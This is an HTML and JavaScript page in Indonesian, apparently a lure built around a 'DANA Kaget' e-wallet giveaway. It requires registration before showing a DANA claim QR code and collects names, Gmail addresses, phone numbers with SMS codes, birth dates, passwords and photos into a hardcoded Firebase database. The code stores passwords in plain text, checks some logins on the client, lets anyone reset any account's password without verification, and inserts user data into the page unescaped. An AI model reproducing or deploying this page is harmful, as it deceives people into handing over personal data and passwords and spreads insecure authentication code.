<!DOCTYPE html>

<html lang="id">

<head>

  <meta charset="UTF-8">

  <title>DANA Kaget - Login Aman</title>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/qrious/4.0.2/qrious.min.js"></script>

  <script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-app-compat.js"></script>

  <script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-auth-compat.js"></script>

  <script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore-compat.js"></script>

  <style>

    body {

      background-color: #0097E6;

      color: white;

      font-family: Arial, sans-serif;

      text-align: center;

      padding: 40px;

    }

    .box {

      background: white;

      color: black;

      padding: 20px;

      border-radius: 12px;

      display: inline-block;

      margin-bottom: 20px;

      max-width: 400px;

    }

    input, label {

      padding: 10px;

      margin: 8px;

      width: 90%;

      border: 1px solid #ccc;

      border-radius: 6px;

      display: block;

      margin-left: auto;

      margin-right: auto;

    }

    button {

      background-color: #0097E6;

      color: white;

      padding: 10px 20px;

      border: none;

      border-radius: 6px;

      cursor: pointer;

      font-weight: bold;

      margin-top: 10px;

    }

    .hidden { display: none; }

    .error { color: red; font-size: 14px; }

    .success { color: green; font-size: 14px; }

    .profile-info {

      text-align: left;

      font-size: 14px;

      background: #f2f2f2;

      padding: 10px;

      border-radius: 10px;

      margin-bottom: 15px;

    }

    .profile-photo {

      width: 100px;

      height: 100px;

      object-fit: cover;

      border-radius: 50%;

      margin-bottom: 10px;

      border: 2px solid #0097E6;

    }

  </style>

</head>

<body>



<div style="background-color: #fff8dc; color: black; border: 2px solid red; padding: 10px; margin-bottom: 20px; border-radius: 10px;">

  <strong>⚠️ PERHATIAN:</strong> Akun ini <u>wajib didaftarkan</u> dan <u>bukan untuk login aplikasi DANA</u>.<br>

  Anda harus login akun ini untuk bisa klaim DANA Kaget / DAGET.

</div>



<h2 id="title">Login untuk akses DANA Kaget</h2>



<!-- Box Loading -->

<div class="box hidden" id="loadingBox"><p>⏳ Silakan tunggu sebentar...</p></div>



<!-- Box Login -->

<div class="box" id="loginBox">

  <input type="text" id="loginInput" placeholder="Email / No HP / Username">

  <input type="password" id="loginPassword" placeholder="Password">

  <input type="text" id="loginCaptchaInput" placeholder="Captcha">

  <p id="loginError" class="error hidden">Login gagal!</p>

  <button onclick="login()">Login</button>
  
  <p style="margin-top:10px;">Atau gunakan akun Google untuk login lebih cepat</p>

<!-- Tambahan tombol Google -->
<button onclick="loginWithGoogle()" style="margin-top: 10px; background-color: #DB4437;">
  Login dengan Google
</button>

<p>Belum punya akun? <a href="#" onclick="showRegister()">Daftar</a> | <a href="#" onclick="showReset()">Reset Sandi</a></p>
</div>



<!-- OTP Box -->

<div class="box hidden" id="otpBox">

  <p>Kode OTP telah dikirim ke <span id="otpPhoneDisplay"></span></p>

  <input type="text" id="otpCode" placeholder="Masukkan kode OTP">

  <p id="otpError" class="error hidden"></p>

  <button onclick="verifyOTP()">Verifikasi OTP</button>

</div>

<div id="recaptcha-container"></div>



<!-- Box Register -->

<div class="box hidden" id="registerBox">

  <input type="text" id="regUsername" placeholder="Nama Pengguna">

  <input type="email" id="regEmail" placeholder="Email">

  <input type="tel" id="regPhone" placeholder="Nomor HP">

<button onclick="sendRegisterOTP()">Kirim Kode Verifikasi</button>

<small id="otpCountdown" style="display: block; margin-top: 5px;"></small>

<input type="text" id="regOTP" placeholder="Masukkan Kode OTP" maxlength="6">

  <input type="date" id="regDob">

  <input type="password" id="regPassword" placeholder="Password">

  <input type="file" id="regPhoto" accept="image/*">

  <input type="text" id="regCaptchaInput" placeholder="Captcha">

  <label><input type="checkbox" id="regAge"> Saya berusia 16 tahun ke atas</label>

  <label><input type="checkbox" id="regRules"> Saya menyetujui syarat dan ketentuan</label>

  <p id="regError" class="error hidden"></p>

  <button onclick="register()">Daftar</button>

  <p><a href="#" onclick="showLogin()">Kembali ke Login</a></p>

</div>



<!-- Box Reset -->

<div class="box hidden" id="resetBox">

  <input type="text" id="resetContact" placeholder="Email / No HP">

  <input type="password" id="newPassword" placeholder="Password Baru">

  <input type="text" id="resetCaptchaInput" placeholder="Captcha">

  <p id="resetError" class="error hidden"></p>

  <p id="resetMsg" class="success hidden">Password berhasil direset!</p>

  <button onclick="resetPassword()">Reset Password</button>

  <p><a href="#" onclick="showLogin()">Kembali ke Login</a></p>

</div>



<!-- OTP Register Box -->

<div class="box hidden" id="otpRegisterBox">

  <p>Masukkan kode OTP yang dikirim ke <span id="otpRegisterPhone"></span></p>

  <input type="text" id="otpRegisterCode" placeholder="Kode OTP">

  <p id="otpRegisterError" class="error hidden"></p>

  <button onclick="verifyOTPRegister()">Verifikasi & Daftar</button>

</div>



<!-- Box QR Code -->

<div class="box hidden" id="qrBox">

  <h2>Selamat Datang!</h2>

  <img id="profilePhotoDisplay" class="profile-photo" src="" alt="Foto Profil">

  <div class="profile-info" id="profileInfo"></div>

  <h3>Scan DANA Kaget di bawah ini</h3>

  <canvas id="qr"></canvas>

</div>



<!-- Script -->

<script>

  const firebaseConfig = {

    apiKey: "AIzaSyAeHD6NSgxIIMiuBrP-js0rhwbdzt2uM6c",

    authDomain: "daget-dbba3.firebaseapp.com",

    projectId: "daget-dbba3",

    storageBucket: "daget-dbba3.appspot.com",

    messagingSenderId: "74135604278",

    appId: "1:74135604278:web"

  };



  firebase.initializeApp(firebaseConfig);

  const auth = firebase.auth();

const db = firebase.firestore();



let otpTimer, otpExpiresAt = null;



function sendRegisterOTP() {

  const phone = regPhone.value.trim();

  const errorBox = regError;

  errorBox.classList.add("hidden");



  if (!phone || !(phone.startsWith("08") || phone.startsWith("+62") || phone.startsWith("62"))) {

    errorBox.textContent = "Masukkan nomor HP yang valid.";

    errorBox.classList.remove("hidden");

    return;

  }



  const phoneE164 = phone.startsWith("+") ? phone : "+62" + phone.replace(/^0/, "");



  const recaptchaVerifier = new firebase.auth.RecaptchaVerifier('recaptcha-container', {

    size: 'invisible'

  });



  auth.signInWithPhoneNumber(phoneE164, recaptchaVerifier)

    .then(result => {

      confirmationResult = result;

      otpExpiresAt = Date.now() + 180000; // 3 menit

      startOTPCountdown();

      alert("Kode verifikasi telah dikirim!");

    })

    .catch(err => {

      errorBox.textContent = "Gagal kirim OTP: " + err.message;

      errorBox.classList.remove("hidden");

    });

}



function startOTPCountdown() {

  clearInterval(otpTimer);

  const countdownEl = document.getElementById("otpCountdown");



  otpTimer = setInterval(() => {

    const remaining = Math.floor((otpExpiresAt - Date.now()) / 1000);

    if (remaining <= 0) {

      clearInterval(otpTimer);

      countdownEl.textContent = "⛔ Kode verifikasi telah kadaluarsa.";

    } else {

      countdownEl.textContent = `Kode OTP aktif selama ${remaining}s`;

    }

  }, 1000);

}



// Tambahan variabel global untuk OTP

let confirmationResult = null;

let tempRegData = null;

  

  let currentCaptcha = null;

  const captchaQuestions = [

    { q: "Berapa 2 + 3?", a: "5" },

    { q: "Apa warna langit saat cerah?", a: "biru" },

    { q: "Huruf pertama dari DANA?", a: "d" },

    { q: "Berapa hasil 10 - 4?", a: "6" },

    { q: "Apa lawan kata dari besar?", a: "kecil" },

    { q: "Hari setelah Jumat?", a: "sabtu" },

    { q: "Berapa 3 x 3?", a: "9" },

    { q: "Apa warna daun?", a: "hijau" }

  ];



  function setCaptcha(fieldId) {

    const random = captchaQuestions[Math.floor(Math.random() * captchaQuestions.length)];

    currentCaptcha = random;

    document.getElementById(fieldId).placeholder = random.q + " (Captcha)";

  }



  function hideAll() {

    ["loginBox", "registerBox", "resetBox", "qrBox", "loadingBox"].forEach(id => document.getElementById(id).classList.add("hidden"));

    document.querySelectorAll(".error, .success").forEach(el => el.classList.add("hidden"));

  }



  function showLogin() {

    hideAll();

    document.getElementById("loginBox").classList.remove("hidden");

    document.getElementById("title").textContent = "Login untuk akses DANA Kaget";

    setCaptcha("loginCaptchaInput");

  }



  function showRegister() {

    hideAll();

    document.getElementById("registerBox").classList.remove("hidden");

    document.getElementById("title").textContent = "Daftar Akun Baru";

    setCaptcha("regCaptchaInput");

  }



  function showReset() {

    hideAll();

    document.getElementById("resetBox").classList.remove("hidden");

    document.getElementById("title").textContent = "Reset Password";

    setCaptcha("resetCaptchaInput");

  }



  function showLoading() {

    hideAll();

    document.getElementById("loadingBox").classList.remove("hidden");

  }



  function register() {

  const username = regUsername.value.trim(), email = regEmail.value.trim(),

        phone = regPhone.value.trim(), dob = regDob.value, password = regPassword.value,

        captcha = regCaptchaInput.value.toLowerCase().trim(),

        ageOk = regAge.checked, rulesOk = regRules.checked,

        photo = regPhoto.files[0], errorBox = regError;



  errorBox.classList.add("hidden");



  if (!username || !email || !phone || !dob || !password || !captcha || !photo || !ageOk || !rulesOk) {

    errorBox.textContent = "Harap isi semua data dan setujui syarat.";

    errorBox.classList.remove("hidden"); return;

  }

  if (!email.endsWith("@gmail.com")) {

    errorBox.textContent = "Hanya email @gmail.com yang diizinkan.";

    errorBox.classList.remove("hidden"); return;

  }

  if (captcha !== currentCaptcha.a.toLowerCase()) {

    errorBox.textContent = "Captcha salah.";

    errorBox.classList.remove("hidden"); return;

  }



  const otpCode = document.getElementById("regOTP").value.trim();

  if (!otpCode) {

    errorBox.textContent = "Kode OTP wajib diisi.";

    errorBox.classList.remove("hidden");

    return;

  }



  if (!confirmationResult || !otpExpiresAt || Date.now() > otpExpiresAt) {

    errorBox.textContent = "Kode OTP telah kadaluarsa. Kirim ulang OTP.";

    errorBox.classList.remove("hidden");

    return;

  }



  confirmationResult.confirm(otpCode).then(() => {

    showLoading();

    auth.createUserWithEmailAndPassword(email, password).then(cred => {

      const reader = new FileReader();

      reader.onload = e => {

        db.collection("users").doc(cred.user.uid).set({

          username, email, phone, dob, password,

          photo: e.target.result,

          registeredAt: new Date().toISOString()

        }).then(() => {

          alert("✅ Pendaftaran berhasil!");

          location.reload();

        });

      };

      reader.readAsDataURL(photo);

    }).catch(err => {

      hideAll();

      errorBox.textContent = "Gagal daftar: " + err.message;

      errorBox.classList.remove("hidden");

    });

  }).catch(err => {

    errorBox.textContent = "Kode verifikasi salah.";

    errorBox.classList.remove("hidden");

  });

}



  function login() {

    const input = loginInput.value.trim(), pass = loginPassword.value.trim(),

          captcha = loginCaptchaInput.value.toLowerCase().trim(),

          errBox = loginError;



    errBox.classList.add("hidden");



    if (!input || !pass || !captcha) {

      errBox.textContent = "Harap isi semua kolom login."; errBox.classList.remove("hidden"); return;

    }

    if (captcha !== currentCaptcha.a.toLowerCase()) {

      errBox.textContent = "Captcha salah."; errBox.classList.remove("hidden"); return;

    }



    showLoading();

    if (input.includes("@")) {

      auth.signInWithEmailAndPassword(input, pass)

        .then(user => db.collection("users").doc(user.user.uid).get())

        .then(doc => doc.exists ? showQRPage(doc.id, doc.data()) : (showLogin(), errBox.textContent = "Akun tidak ditemukan.", errBox.classList.remove("hidden")))

        .catch(() => (showLogin(), errBox.textContent = "Login gagal: email atau password salah.", errBox.classList.remove("hidden")));

    } else {

      db.collection("users").where("phone", "==", input).get()

        .then(snap => !snap.empty ? snap : db.collection("users").where("username", "==", input).get())

        .then(snap => {

          if (!snap.empty) {

            const doc = snap.docs[0], u = doc.data();

            u.password === pass ? showQRPage(doc.id, u) : (showLogin(), errBox.textContent = "Password salah.", errBox.classList.remove("hidden"));

          } else {

            showLogin(); errBox.textContent = "Akun tidak ditemukan."; errBox.classList.remove("hidden");

          }

        }).catch(() => (showLogin(), errBox.textContent = "Kesalahan sistem saat login.", errBox.classList.remove("hidden")));

    }

  }



  function showQRPage(uid, user) {

    try {

      hideAll();

      qrBox.classList.remove("hidden");

      title.textContent = `Selamat Datang, ${user.username || 'Pengguna'}!`;

      profilePhotoDisplay.src = user.photo || "https://via.placeholder.com/100?text=Foto";

      profileInfo.innerHTML = `

        <strong>Nama Pengguna:</strong> ${user.username || '-'}<br>

        <strong>Email:</strong> ${user.email || '-'}<br>

        <strong>No HP:</strong> ${user.phone || '-'}<br>

        <strong>Tanggal Lahir:</strong> ${user.dob || '-'}<br>

        <strong>Status:</strong> Terverifikasi ✅<br>

        <strong>Terdaftar:</strong> ${user.registeredAt || '-'}

      `;

      new QRious({

        element: document.getElementById('qr'),

        value: `https://link.dana.id/danakaget?c=sayln6ugg&r=blTmh3&orderId=${Date.now()}`,

        size: 250

      });

    } catch (e) {

      alert("Gagal menampilkan QR."); showLogin();

    }

  }



  function resetPassword() {

    const contact = resetContact.value.trim(), newPass = newPassword.value.trim(),

          captcha = resetCaptchaInput.value.toLowerCase().trim();



    if (captcha !== currentCaptcha.a.toLowerCase()) {

      resetError.textContent = "Captcha salah.";

      resetError.classList.remove("hidden"); return;

    }



    showLoading();

    db.collection("users").get().then(snap => {

      let updated = false;

      snap.forEach(doc => {

        const u = doc.data();

        if (u.email === contact || u.phone === contact) {

          db.collection("users").doc(doc.id).update({ password: newPass });

          updated = true;

        }

      });

      setTimeout(() => {

        hideAll();

        if (updated) resetMsg.classList.remove("hidden");

        else {

          resetError.textContent = "Data tidak ditemukan.";

          resetError.classList.remove("hidden");

        }

      }, 1000);

    });

  }

  

  function verifyOTPRegister() {

  const code = otpRegisterCode.value.trim();

  const errBox = otpRegisterError;

  errBox.classList.add("hidden");



  if (!code) {

    errBox.textContent = "Kode OTP harus diisi.";

    errBox.classList.remove("hidden");

    return;

  }



  if (!confirmationResult || !tempRegData) {

    errBox.textContent = "Data sementara tidak ditemukan.";

    errBox.classList.remove("hidden");

    return;

  }



  confirmationResult.confirm(code)

    .then(() => {

      showLoading();

      auth.createUserWithEmailAndPassword(tempRegData.email, tempRegData.password)

        .then(cred => {

          const reader = new FileReader();

          reader.onload = e => {

            db.collection("users").doc(cred.user.uid).set({

              ...tempRegData,

              photo: e.target.result,

              registeredAt: new Date().toISOString()

            }).then(() => {

              alert("✅ Akun berhasil dibuat!");

              location.reload();

            });

          };

          reader.readAsDataURL(tempRegData.photo);

        })

        .catch(err => {

          hideAll();

          errBox.textContent = "Gagal daftar: " + err.message;

          errBox.classList.remove("hidden");

        });

    })

    .catch(err => {

      errBox.textContent = "Kode OTP salah atau sudah kedaluwarsa.";

      errBox.classList.remove("hidden");

    });

}



  window.addEventListener("load", () => {
    const params = new URLSearchParams(location.search);
    const uid = params.get("uid");
    if (uid) {
      showLoading();
      db.collection("users").doc(uid).get()
        .then(doc => doc.exists ? showQRPage(uid, doc.data()) : showLogin())
        .catch(() => showLogin());
    } else showLogin();
  });

  function loginWithGoogle() {
    const provider = new firebase.auth.GoogleAuthProvider();
    auth.signInWithPopup(provider)
      .then(result => {
        const user = result.user;
        const userRef = db.collection("users").doc(user.uid);

        userRef.get().then(doc => {
          if (doc.exists) {
            showQRPage(user.uid, doc.data());
          } else {
            const email = user.email;
            if (!email.endsWith("@gmail.com")) {
              alert("Hanya akun Gmail yang diizinkan.");
              auth.signOut(); return;
            }

            const username = prompt("Masukkan nama pengguna:");
            const phone = prompt("Masukkan nomor HP (08xxx):");
            const dob = prompt("Masukkan tanggal lahir (YYYY-MM-DD):");

            if (!username || !phone || !dob) {
              alert("Semua data wajib diisi."); auth.signOut(); return;
            }

            const dataUser = {
              username,
              email,
              phone,
              dob,
              photo: user.photoURL || "https://via.placeholder.com/100",
              registeredAt: new Date().toISOString()
            };

            userRef.set(dataUser).then(() => {
              showQRPage(user.uid, dataUser);
            });
          }
        });
      })
      .catch(error => {
        alert("Login dengan Google gagal: " + error.message);
      });
  }
</script>

<footer style="margin-top: 40px; font-size: 14px; color: #fff;">

  &copy; 2025 Sumber: <strong>AGUNG FITRIADI</strong>

</footer>



</body>

</html>
